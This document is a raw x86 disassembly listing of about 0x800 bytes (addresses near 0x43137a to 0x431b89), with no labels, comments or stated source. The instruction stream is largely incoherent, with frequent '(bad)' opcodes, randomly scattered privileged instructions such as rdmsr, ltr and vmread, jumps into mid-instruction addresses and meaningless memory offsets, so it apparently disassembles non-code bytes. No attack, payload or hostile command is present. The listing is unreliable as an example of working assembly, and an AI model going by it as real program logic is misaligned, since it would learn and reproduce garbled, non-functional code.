  43137a:	mov    DWORD PTR ds:0x7c0ec88,esi
  431380:	mov    edx,edi
  431382:	pushf  
  431383:	pop    es
  431384:	jmp    FWORD PTR [edx+0x66]
  431387:	add    BYTE PTR [ebp-0x990175],al
  43138d:	inc    ebp
  43138e:	test   DWORD PTR [ebx-0x2f00f202],eax
  431394:	push   ebp
  431395:	mov    edi,eax
  431397:	mov    dh,BYTE PTR [eax+0x266ff51]
  43139d:	push   ebp
  43139e:	add    BYTE PTR [ebx-0x764b0777],al
  4313a4:	dec    DWORD PTR [esi+0x661851e8]
  4313aa:	add    BYTE PTR [ebp-0x7b],dl
  4313ad:	cmp    esi,0xfffffffb
  4313b0:	dec    DWORD PTR [ecx+0x51fe9285]
  4313b6:	jmp    DWORD PTR [esi-0x75]
  4313b9:	push   ebp
  4313ba:	hlt    
  4313bb:	data16 (bad) 
  4313bd:	dec    ebp
  4313be:	ret    
  4313bf:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4313c5:	lea    edx,[eax-0x1]
  4313c8:	jne    0x43139b
  4313ca:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4313d0:	dec    BYTE PTR [ecx+0x51559eff]
  4313d6:	mov    DWORD PTR [esi-0x4c],esp
  4313d9:	push   ebp
  4313da:	jmp    DWORD PTR [esi-0x18]
  4313dd:	inc    ebp
  4313de:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4313e4:	(bad)  
  4313e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4313e6:	inc    eax
  4313e8:	test   DWORD PTR [esi-0x2],esp
  4313eb:	inc    ebp
  4313ec:	dec    DWORD PTR [ebp-0x760bde75]
  4313f2:	(bad)  
  4313f3:	test   al,0xc3
  4313f5:	mov    DWORD PTR [ebp-0x769b56],ecx
  4313fb:	lods   al,BYTE PTR ds:[esi]
  4313fc:	push   eax
  4313fd:	inc    ebp
  4313fe:	jne    0x43140f
  431400:	dec    DWORD PTR [ebp+0x8]
  431403:	mov    ecx,DWORD PTR [ebx]
  431405:	sbb    al,0x0
  431407:	(bad)  
  431408:	mov    eax,0xc14fc3
  43140d:	mov    DWORD PTR [ecx-0xbabf64],ecx
  431413:	movsx  ecx,WORD PTR [ebp+0x4e]
  431417:	xor    eax,DWORD PTR [eax]
  431419:	add    eax,edi
  43141b:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  431421:	xor    edi,DWORD PTR [eax+0x854f66]
  431427:	dec    BYTE PTR [ecx-0x76bb01]
  43142d:	mov    BYTE PTR [ebx-0x76724001],al
  431433:	pushf  
  431434:	inc    esi
  431435:	(bad)  
  431436:	dec    DWORD PTR [ebp-0x7abe6373]
  43143c:	sar    esi,0x89
  43143f:	dec    DWORD PTR [eax+0x0]
  431442:	inc    DWORD PTR [eax]
  431444:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  43144b:	xlat   BYTE PTR ds:[ebx]
  43144c:	dec    edx
  43144d:	add    bh,bh
  43144f:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431455:	lea    esp,[esi-0x50]
  431458:	(bad)  
  431459:	(bad)  
  43145a:	call   DWORD PTR [eax-0x1]
  43145d:	inc    ebp
  43145e:	rdpmc  
  431460:	add    BYTE PTR [ebx],al
  431462:	push   ax
  431464:	lea    eax,[ebp-0x1]
  43146a:	js     0x43146b
  43146c:	add    al,bh
  43146e:	push   bp
  431470:	lea    ecx,[ebp-0x7701]
  431476:	fmul   DWORD PTR [ebp-0x7a997800]
  43147c:	(bad)  
  43147d:	(bad)  
  43147e:	(bad)  
  43147f:	(bad)  
  431480:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431486:	dec    eax
  431487:	mov    eax,0x8d8dffff
  43148c:	mov    al,0xb0
  43148e:	(bad)  
  43148f:	call   DWORD PTR [ecx+0x50]
  431492:	dec    ebp
  431493:	inc    ebp
  431494:	mov    esi,0x7030833
  431499:	push   eax
  43149a:	into   
  43149b:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  4314a1:	call   DWORD PTR [ecx-0x8]
  4314a4:	lea    edx,[ebp-0x1]
  4314a7:	jmp    0x7616ab
  4314ac:	inc    eax
  4314ad:	jnp    0x43143c
  4314af:	add    dh,bh
  4314b1:	inc    WORD PTR [ebp-0x8a00b0]
  4314b8:	mov    edx,eax
  4314ba:	inc    esp
  4314bb:	add    bh,bh
  4314bd:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4314c3:	dec    DWORD PTR [ebx-0x7f820301]
  4314c9:	add    BYTE PTR [ecx],al
  4314cb:	data16 add BYTE PTR [ebp-0xb30077],al
  4314d2:	inc    eax
  4314d4:	(bad)  
  4314d5:	dec    si
  4314d7:	test   edi,edi
  4314d9:	(bad)  
  4314da:	cmp    edi,edi
  4314dc:	add    ecx,DWORD PTR [edi-0x39]
  4314df:	mov    edx,DWORD PTR [edx+0x66]
  4314e2:	inc    DWORD PTR [ebp-0x3d00cb]
  4314e8:	mov    eax,0x66ff8b5e
  4314ee:	jmp    0xb4ff:0xc7ff3895
  4314f5:	push   ecx
  4314f6:	inc    DWORD PTR [ebx-0x76ffccbb]
  4314fc:	call   DWORD PTR [esi-0x1]
  4314ff:	dec    DWORD PTR [eax]
  431501:	mov    ecx,0x805ff
  431506:	inc    ebp
  431507:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  43150d:	mov    ecx,0x35784
  431512:	add    BYTE PTR [ecx-0xffa59b],cl
  431518:	inc    ebp
  431519:	mov    ecx,0x9c6131
  43151e:	(bad)  
  43151f:	mov    eax,ebx
  431521:	pop    esp
  431522:	test   edi,edi
  431524:	clc    
  431525:	lea    eax,[ebp-0x24]
  431528:	cmp    eax,0xc7fe9c8d
  43152d:	push   eax
  43152f:	lea    eax,[ebp+0x45fff8fe]
  431535:	mov    esi,DWORD PTR [ecx]
  431537:	hlt    
  431538:	lahf   
  431539:	push   esp
  43153a:	mov    edx,DWORD PTR [ecx-0x4]
  43153d:	xor    eax,DWORD PTR [eax+0x7201bb]
  431543:	add    BYTE PTR [ebp-0x35],al
  431546:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  43154c:	mov    edx,DWORD PTR [ecx-0x74]
  43154f:	rol    BYTE PTR [eax],0x8d
  431552:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431556:	nop
  431557:	push   ecx
  431558:	add    bh,bh
  43155a:	mov    esp,edi
  43155c:	in     al,0x85
  43155e:	jge    0x43155e
  431560:	test   edi,edi
  431562:	jne    0x4314e9
  431564:	(bad)  
  431565:	(bad)  
  431566:	sbb    bh,bh
  431568:	push   ebp
  431569:	inc    ebp
  43156a:	call   0xffdc0ffa
  43156f:	add    BYTE PTR [ebp+0x66],al
  431572:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431578:	cmp    al,0x85
  43157a:	ud0    eax,DWORD PTR [ebp-0x1]
  43157e:	test   DWORD PTR [edi+0x74],ecx
  431581:	dec    edi
  431582:	inc    DWORD PTR [ebp-0x50004]
  431588:	dec    DWORD PTR [edi-0x75]
  43158b:	dec    esi
  43158c:	cld    
  43158d:	test   DWORD PTR [eax+0xff01ff],eax
  431593:	icebp  
  431594:	add    BYTE PTR [edi-0x3a],cl
  431597:	test   ebx,eax
  431599:	inc    BYTE PTR [ebp-0x1]
  43159c:	jne    0x43159e
  43159e:	mov    eax,DWORD PTR [eax]
  4315a0:	cld    
  4315a1:	xor    BYTE PTR [ecx+0x500155],cl
  4315a7:	push   ebp
  4315a8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4315ae:	add    BYTE PTR [ebp+0x35e90f50],al
  4315b4:	add    al,BYTE PTR [eax]
  4315b6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4315bc:	add    ah,ch
  4315be:	or     BYTE PTR [ebp+0x4501f845],dh
  4315c4:	jmp    0xdf18ba
  4315c9:	(bad)  
  4315ca:	nop    ecx
  4315cd:	test   DWORD PTR [ebp+0x4502f8],eax
  4315d3:	xor    ecx,DWORD PTR [ebp-0x64]
  4315d6:	mov    eax,edi
  4315d8:	mov    ebx,DWORD PTR [eax+edx*2]
  4315db:	add    eax,0x45fef885
  4315e0:	dec    DWORD PTR [ebx+0x339445]
  4315e6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4315ec:	dec    DWORD PTR [ebx-0x460f0375]
  4315f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4315f3:	add    esi,edi
  4315f5:	add    bh,bh
  4315f7:	rdpmc  
  4315f9:	add    BYTE PTR [ebx],0x1
  4315fc:	mov    DWORD PTR [eax],eax
  4315fe:	add    al,0x45
  431600:	dec    DWORD PTR [ecx-0x360b3373]
  431606:	dec    DWORD PTR [esi]
  431608:	push   eax
  431609:	jne    0x431650
  43160b:	mov    esi,DWORD PTR [ebx]
  43160d:	cld    
  43160e:	add    esp,ecx
  431610:	push   eax
  431611:	inc    DWORD PTR [ebp-0x75]
  431614:	add    eax,0x800e4
  431619:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43161f:	mov    DWORD PTR [ecx],eax
  431621:	sbb    al,0x0
  431623:	leave  
  431624:	test   DWORD PTR [edi-0x2],eax
  431627:	jne    0x431628
  431629:	call   0xff44002e
  43162e:	xor    BYTE PTR [ebp+0x4d],al
  431631:	mov    edi,edi
  431633:	enter  0x8,0x4d
  431637:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43163d:	mov    eax,DWORD PTR [eax]
  43163f:	cld    
  431640:	add    DWORD PTR [ecx],ebx
  431642:	inc    ebp
  431643:	dec    ebp
  431644:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43164a:	inc    eax
  43164b:	dec    DWORD PTR [ecx-0x270375]
  431651:	add    BYTE PTR [ebx-0x39d72701],cl
  431657:	xchg   ecx,eax
  431658:	ret    
  431659:	add    BYTE PTR [ebp-0x830075],al
  43165f:	add    BYTE PTR [ebp-0x75],al
  431662:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431668:	lea    edi,[edi-0xc]
  43166b:	add    bh,bh
  43166d:	mov    edx,DWORD PTR [eax-0x7b]
  431670:	inc    ebp
  431671:	rdpmc  
  431673:	jne    0x431678
  431675:	add    BYTE PTR [eax-0x75],dl
  431678:	inc    ebp
  431679:	clc    
  43167a:	add    eax,0x400009
  43167f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431685:	mov    eax,DWORD PTR [ecx]
  431687:	in     al,dx
  431688:	add    dh,al
  43168a:	test   ebx,eax
  43168c:	inc    BYTE PTR [ebp-0xff0001]
  431692:	add    BYTE PTR [ebp-0x43],al
  431695:	cmp    esi,0xfffffff8
  431698:	(bad)  
  431699:	push   DWORD PTR [eax]
  43169b:	add    BYTE PTR [ebp-0x3a],dl
  43169e:	test   ebx,eax
  4316a0:	je     0x431627
  4316a2:	mov    edi,edi
  4316a4:	sbb    al,0xff
  4316a6:	test   DWORD PTR gs:[eax],eax
  4316a9:	(bad)  
  4316aa:	js     0x4316ab
  4316ac:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4316b2:	sub    eax,ebx
  4316b4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4316ba:	add    eax,DWORD PTR [eax]
  4316bc:	dec    ebp
  4316bd:	push   eax
  4316be:	mov    al,BYTE PTR [ebp+0x1]
  4316c1:	mov    eax,DWORD PTR [ebp-0x68]
  4316c4:	mov    eax,DWORD PTR [eax]
  4316c6:	sbb    bh,al
  4316c8:	or     ah,dh
  4316ca:	dec    ebp
  4316cb:	inc    DWORD PTR [eax+0x4]
  4316ce:	push   ecx
  4316cf:	add    BYTE PTR [edx-0x1],dh
  4316d2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4316d8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4316e2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4316e8:	push   ecx
  4316e9:	cmp    BYTE PTR [ebx],al
  4316eb:	inc    ebp
  4316ec:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4316f2:	(bad)  
  4316f3:	(bad)  
  4316f4:	in     al,0xff
  4316f6:	add    BYTE PTR [ebp+0x0],al
  4316f9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4316ff:	add    al,bh
  431701:	(bad)  
  431702:	jmp    0x8d85:0x74b0558d
  431709:	dec    DWORD PTR [eax]
  43170b:	call   DWORD PTR [ebp-0x7b]
  43170e:	mov    edi,esi
  431710:	lock call DWORD PTR [ebp-0x75]
  431714:	mov    esi,esp
  431716:	mov    ah,0xc6
  431718:	mov    bh,0xc3
  43171a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431720:	add    DWORD PTR [eax],0x450050ff
  431726:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43172c:	inc    edi
  43172e:	push   esp
  431730:	jmp    0xcd00:0x650481ff
  431737:	mov    DWORD PTR [ebx],esi
  431739:	clc    
  43173a:	cmp    edi,0xff9cff3c
  431740:	jne    0x43174a
  431742:	mov    eax,eax
  431744:	add    esi,DWORD PTR [eax]
  431746:	int3   
  431747:	inc    ebp
  431748:	cmp    al,0x83
  43174a:	add    BYTE PTR [eax],bl
  43174c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431752:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431758:	mov    edi,eax
  43175a:	cmp    BYTE PTR [ebp+0x45],cl
  43175d:	jmp    0x4316ea
  43175f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431762:	inc    ebp
  431763:	or     al,0x2
  431765:	dec    DWORD PTR [ebp+0x18]
  431768:	jne    0x4317bf
  43176a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  431770:	mov    edi,DWORD PTR [ebx]
  431772:	in     al,0x50
  431774:	xchg   ecx,eax
  431775:	jmp    0x343667a
  43177a:	adc    al,0x8b
  43177c:	inc    ebp
  43177d:	mov    al,ds:0x8b04008b
  431782:	push   ebp
  431783:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431789:	push   ebp
  43178a:	test   DWORD PTR [ebx-0x2800d701],ecx
  431790:	inc    ebp
  431791:	dec    ebp
  431792:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431798:	mov    DWORD PTR [eax],0xe9ff00f4
  43179e:	add    al,0x0
  4317a0:	add    BYTE PTR [eax],al
  4317a2:	mov    eax,edx
  4317a4:	push   eax
  4317a5:	rol    DWORD PTR [ebp-0xf0177],1
  4317ab:	bound  eax,QWORD PTR [ebp+0x50]
  4317ae:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4317b4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4317ba:	mov    al,0xf
  4317bc:	test   DWORD PTR [edx],edx
  4317be:	call   DWORD PTR [ebp-0x7a0001]
  4317c4:	(bad)  
  4317c5:	loop   0x4317c6
  4317c7:	jnp    0xc6990bcd
  4317cd:	mov    eax,ebx
  4317cf:	cmp    al,0x8b
  4317d1:	(bad)  
  4317d2:	cld    
  4317d3:	shr    esi,0xc
  4317d6:	add    dl,al
  4317d8:	push   eax
  4317d9:	lea    eax,[ebp-0x1]
  4317dc:	mov    edx,esi
  4317de:	cwde   
  4317df:	cli    
  4317e0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4317e6:	or     BYTE PTR [eax],cl
  4317e8:	inc    ebp
  4317e9:	dec    ebp
  4317ea:	inc    DWORD PTR [ebx+0x74803914]
  4317f0:	add    DWORD PTR [ebx+0x451800],ecx
  4317f6:	call   DWORD PTR [eax+edx*1]
  4317f9:	add    ecx,DWORD PTR [ebp-0x34]
  4317fc:	push   edi
  4317fd:	adc    al,0x8
  4317ff:	mov    edx,DWORD PTR [ebp-0x14]
  431802:	mov    ecx,DWORD PTR [ebp+0x18]
  431805:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431809:	inc    DWORD PTR [eax+esi*8]
  43180c:	inc    ebp
  43180d:	stos   BYTE PTR es:[edi],al
  43180e:	mov    edx,DWORD PTR [ebp-0x4]
  431811:	add    DWORD PTR [ebp-0x1c],eax
  431814:	mov    edx,DWORD PTR [ebp-0x70]
  431817:	cmp    eax,DWORD PTR [eax]
  431819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43181a:	mov    eax,DWORD PTR [eax]
  43181c:	cld    
  43181d:	jae    0x43179f
  43181f:	add    eax,DWORD PTR [ecx]
  431821:	clc    
  431822:	add    BYTE PTR [eax+0x30],dl
  431825:	mov    DWORD PTR [ecx],esi
  431827:	clc    
  431828:	pop    ds
  431829:	inc    ebp
  43182a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431830:	(bad)  
  431831:	push   DWORD PTR [edi]
  431833:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431839:	(bad)  
  43183a:	jae    0x43183b
  43183c:	mov    eax,DWORD PTR [ebp-0x740175]
  431842:	sub    eax,DWORD PTR [eax]
  431844:	add    eax,DWORD PTR [eax]
  431846:	mov    DWORD PTR [ecx+0x5f],eax
  431849:	mov    DWORD PTR [ebx-0x4],ebx
  43184c:	ret    0xff
  43184f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431855:	ret    
  431856:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43185c:	add    BYTE PTR [ebp-0x7d],al
  43185f:	mov    DWORD PTR [eax],eax
  431861:	add    al,0x84
  431863:	inc    DWORD PTR [ecx]
  431865:	lea    eax,[eax]
  431867:	hlt    
  431868:	sar    bh,cl
  43186a:	test   BYTE PTR [eax+0x1],dl
  43186d:	inc    ebp
  43186e:	add    BYTE PTR [ebx],dh
  431870:	test   BYTE PTR [ebx],0x84
  431873:	push   eax
  431874:	add    BYTE PTR [ebp+0x0],al
  431877:	add    eax,0x86
  43187c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  431882:	add    BYTE PTR [ecx],al
  431884:	add    BYTE PTR [eax],al
  431886:	mov    esi,0x550030
  43188b:	mov    ecx,DWORD PTR [edi]
  43188d:	cld    
  43188e:	fidiv  DWORD PTR [ebp+0x0]
  431891:	mov    edi,DWORD PTR [ecx]
  431893:	xor    BYTE PTR [eax+eax*1],0x84
  431897:	add    eax,DWORD PTR [eax]
  431899:	sbb    BYTE PTR [eax],al
  43189b:	jne    0x43184e
  43189d:	mov    eax,DWORD PTR [ecx]
  43189f:	sbb    BYTE PTR [eax],al
  4318a1:	mov    DWORD PTR [ebp-0x1],esp
  4318a4:	add    BYTE PTR [eax+0x30e45ca],bh
  4318aa:	ret    0xb7fc
  4318ad:	dec    ebp
  4318ae:	or     al,0x89
  4318b0:	dec    ebp
  4318b1:	cld    
  4318b2:	cmovne ecx,DWORD PTR [eax-0x75]
  4318b6:	add    edi,esp
  4318b8:	seto   BYTE PTR [esi-0x72ffffff]
  4318bf:	inc    ebp
  4318c0:	adc    al,0x8b
  4318c2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4318c9:	cmp    DWORD PTR [edi+0x72],edx
  4318cc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4318d2:	gs cmp al,0x0
  4318d5:	je     0x4318ad
  4318d7:	push   eax
  4318d8:	sar    BYTE PTR [eax],1
  4318da:	mov    bh,0x3e
  4318dc:	push   cs
  4318dd:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4318e3:	add    DWORD PTR [ecx+0x12],ebp
  4318e6:	dec    edx
  4318e7:	(bad)  
  4318e8:	mov    eax,edx
  4318ea:	in     al,dx
  4318eb:	adc    DWORD PTR [ecx],esi
  4318ed:	pop    esi
  4318ee:	inc    ecx
  4318ef:	leave  
  4318f0:	or     DWORD PTR [eax],ebx
  4318f2:	gs push ebp
  4318f4:	add    ah,ch
  4318f6:	into   
  4318f7:	in     al,dx
  4318f8:	enter  0xb756,0xf0
  4318fc:	push   cs
  4318fd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431907:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  43190d:	jnp    0x74439e15
  431913:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431919:	add    BYTE PTR [edi],cl
  43191b:	mov    edi,DWORD PTR [ecx-0x78]
  43191e:	ltr    WORD PTR [ecx-0x7b]
  431922:	dec    DWORD PTR [edi]
  431924:	clc    
  431925:	out    0x45,eax
  431927:	add    BYTE PTR [eax],cl
  431929:	cmp    ebx,0xffffff8c
  43192c:	jge    0x43192e
  43192e:	jb     0x431940
  431930:	je     0x5219b0
  431936:	pop    edx
  431937:	push   esi
  431938:	mov    ecx,DWORD PTR [edi]
  43193a:	in     al,dx
  43193b:	rol    DWORD PTR [ebp+0x0],1
  43193e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431945:	cmp    DWORD PTR [ecx],0xfffffff0
  431948:	hlt    
  431949:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43194f:	(bad)  
  431951:	push   eax
  431952:	jns    0xb842fdd0
  431958:	lock push cs
  43195a:	ror    edx,0x3
  43195d:	test   BYTE PTR [ecx+0x5500e800],cl
  431963:	dec    eax
  431964:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431968:	(bad)  
  431969:	mov    esi,0x7f33ff5f
  43196e:	inc    eax
  43196f:	test   DWORD PTR [edx],eax
  431971:	je     0x431933
  431973:	mov    ecx,ecx
  431975:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431979:	and    eax,DWORD PTR [eax+0xf0103]
  43197f:	jp     0x43196d
  431981:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431985:	add    edx,DWORD PTR [edi+0x74]
  431988:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43198e:	add    BYTE PTR [ebp-0x74c48bbb],al
  431994:	je     0x431919
  431996:	cmp    eax,edi
  431998:	js     0x4319bd
  43199a:	add    eax,0xeb0fc003
  43199f:	jns    0x43192c
  4319a1:	vmread DWORD PTR [ecx+0x45],ebx
  4319a5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  4319ab:	adc    al,0x8b
  4319ad:	jge    0x4319c3
  4319af:	mov    edi,DWORD PTR [eax-0x4]
  4319b2:	add    edi,DWORD PTR [edi]
  4319b4:	or     bh,bh
  4319b6:	push   ebp
  4319b7:	push   es
  4319b8:	mov    DWORD PTR [ebp-0x4],ebx
  4319bb:	add    edi,esi
  4319bd:	pop    es
  4319be:	add    esi,DWORD PTR [edi-0x48ccf183]
  4319c4:	mov    DWORD PTR [esp+esi*8],ecx
  4319c7:	inc    ebp
  4319c8:	pop    ebp
  4319c9:	xor    DWORD PTR [esi-0x4],0x3b
  4319cd:	add    edx,DWORD PTR [ecx+edi*1]
  4319d0:	push   es
  4319d1:	clc    
  4319d2:	mov    bh,0xdb
  4319d4:	jp     0x43198d
  4319d6:	add    cl,BYTE PTR [esi]
  4319d8:	div    DWORD PTR [edi+0x4d8b0c1c]
  4319de:	test   edi,edi
  4319e0:	je     0x4319d6
  4319e2:	mov    eax,ecx
  4319e4:	or     BYTE PTR [ebx],al
  4319e6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4319ec:	jbe    0x431a60
  4319ee:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4319f4:	add    ecx,DWORD PTR [esi]
  4319f6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4319fc:	add    eax,DWORD PTR [ebx-0x287af783]
  431a02:	je     0x431a51
  431a04:	mov    DWORD PTR [ecx],edi
  431a06:	mov    esi,eax
  431a08:	hlt    
  431a09:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431a10:	jb     0x4319d2
  431a12:	jmp    0x4319ff
  431a14:	xor    esi,DWORD PTR [ebx]
  431a16:	pop    edi
  431a17:	pop    esi
  431a18:	pop    ebx
  431a19:	ret    
  431a1a:	ret    0x8b
  431a1d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a23:	xor    DWORD PTR [ecx],0xc
  431a26:	pushf  
  431a27:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431a2d:	rdmsr  
  431a2f:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431a36:	dec    ebp
  431a37:	ret    
  431a38:	mov    edi,DWORD PTR [esi-0x4]
  431a3b:	pop    eax
  431a3c:	dec    ebp
  431a3d:	jne    0x4319ca
  431a3f:	xor    edi,esp
  431a41:	inc    eax
  431a42:	dec    ebp
  431a43:	jbe    0x431a98
  431a45:	inc    eax
  431a46:	pop    ebp
  431a47:	add    edx,DWORD PTR [esi+0x8]
  431a4a:	push   esp
  431a4b:	dec    eax
  431a4c:	push   ecx
  431a4d:	mov    eax,edi
  431a4f:	and    al,0xf0
  431a51:	jo     0x431a3e
  431a53:	mov    eax,DWORD PTR [ebx]
  431a55:	sbb    BYTE PTR [ebp+0x4d],cl
  431a58:	mov    eax,DWORD PTR [ebx]
  431a5a:	nop
  431a5b:	or     BYTE PTR [eax],al
  431a5d:	jne    0x431ab6
  431a5f:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431a65:	cld    
  431a66:	xor    edi,edi
  431a68:	add    edi,DWORD PTR [ebp+0x3]
  431a6b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431a71:	js     0x4319f7
  431a73:	jae    0x431a77
  431a75:	(bad)  
  431a77:	xor    al,0x5d
  431a79:	jmp    0x431a06
  431a7b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431a82:	fdecstp 
  431a84:	test   BYTE PTR [edi],ah
  431a86:	add    bh,BYTE PTR [ebp+0x0]
  431a89:	add    ebx,DWORD PTR [ebp-0x77]
  431a8c:	mov    edi,eax
  431a8e:	cmp    al,0x0
  431a91:	adc    dh,BYTE PTR [ebx]
  431a93:	jge    0x431a98
  431a95:	mov    edi,DWORD PTR [ebx]
  431a97:	jl     0x431aa8
  431a99:	clc    
  431a9a:	dec    edi
  431a9b:	jge    0x431a9d
  431a9d:	mov    eax,DWORD PTR [ebx]
  431a9f:	jb     0x431aa9
  431aa1:	mov    ecx,DWORD PTR [ebp-0x8]
  431aa4:	mov    edi,edi
  431aa6:	xor    edx,DWORD PTR [eax]
  431aa8:	add    edi,DWORD PTR [ebx]
  431aaa:	mov    DWORD PTR [ebp-0x10],edi
  431aad:	inc    edi
  431aae:	pop    ebp
  431aaf:	jge    0x431aec
  431ab1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431ab5:	mov    edx,0xc05d87f0
  431aba:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431abe:	fimul  WORD PTR [eax]
  431ac0:	fist   WORD PTR [ebp+0x1c]
  431ac3:	in     al,dx
  431ac4:	jne    0x431ab2
  431ac6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431acc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431ad0:	fdivp  st(0),st
  431ad2:	fild   WORD PTR [ebp+0x4510f85c]
  431ad8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431ade:	inc    ebp
  431adf:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431ae5:	mov    ebp,DWORD PTR [ebx-0x4]
  431ae8:	adc    al,0x8b
  431aea:	rcl    DWORD PTR [eax],0x48
  431aed:	mov    esi,0x7080803
  431af2:	fiadd  WORD PTR [ebp+0x4d]
  431af5:	(bad)  
  431af6:	mov    edx,DWORD PTR [edx-0x4]
  431af9:	mov    edx,DWORD PTR [ebp-0x4]
  431afc:	xor    ebx,DWORD PTR [ebx+0x330103]
  431b02:	mov    DWORD PTR [edi+0x872dc],edi
  431b08:	xlat   BYTE PTR ds:[ebx]
  431b09:	into   
  431b0a:	ffreep st(6)
  431b0c:	retf   0x6c7
  431b0f:	iret   
  431b10:	dec    ebp
  431b11:	inc    ebp
  431b12:	mov    DWORD PTR [ebx],edi
  431b14:	fmul   QWORD PTR [edi]
  431b16:	dec    ebp
  431b17:	jnp    0x431b4c
  431b19:	add    BYTE PTR [ebx],al
  431b1b:	mov    ecx,DWORD PTR [esp+edi*8]
  431b1e:	inc    ebp
  431b1f:	dec    ebp
  431b20:	lea    esi,[ebx]
  431b22:	add    DWORD PTR [ebx],eax
  431b24:	jb     0x431b61
  431b26:	add    BYTE PTR [edi],cl
  431b28:	inc    ebp
  431b29:	imul   eax,edi,0x858bd800
  431b2f:	cld    
  431b30:	clc    
  431b31:	mov    DWORD PTR [ebp+0x0],eax
  431b34:	inc    DWORD PTR [eax]
  431b36:	or     al,0xde
  431b38:	sbb    bh,0x1
  431b3b:	retf   
  431b3c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431b43:	dec    ebp
  431b44:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431b4a:	enter  0x12de,0xdf
  431b4e:	inc    ebp
  431b4f:	pop    ebp
  431b50:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b56:	add    DWORD PTR [edx],edx
  431b58:	add    BYTE PTR [ebp+0x50],dl
  431b5b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431b61:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431b67:	or     ah,al
  431b69:	pop    ss
  431b6a:	cdq    
  431b6b:	push   ebp
  431b6c:	clc    
  431b6d:	mov    eax,DWORD PTR [ebp-0x4]
  431b70:	xor    edx,edx
  431b72:	add    esi,DWORD PTR [ebx]
  431b74:	cmp    eax,DWORD PTR [ebx]
  431b76:	hlt    
  431b77:	cmp    DWORD PTR [ebx],esp
  431b79:	or     al,BYTE PTR [ebp+0xf]
  431b7c:	mov    eax,DWORD PTR [edx]
  431b7e:	loopne 0x431b80
  431b80:	(bad)  
  431b81:	mov    ecx,esi
  431b83:	cld    
  431b84:	pushf  
  431b85:	pop    ebp
  431b86:	fwait
  431b87:	mov    esi,DWORD PTR [edx]
  431b89:	lock mov eax,eax
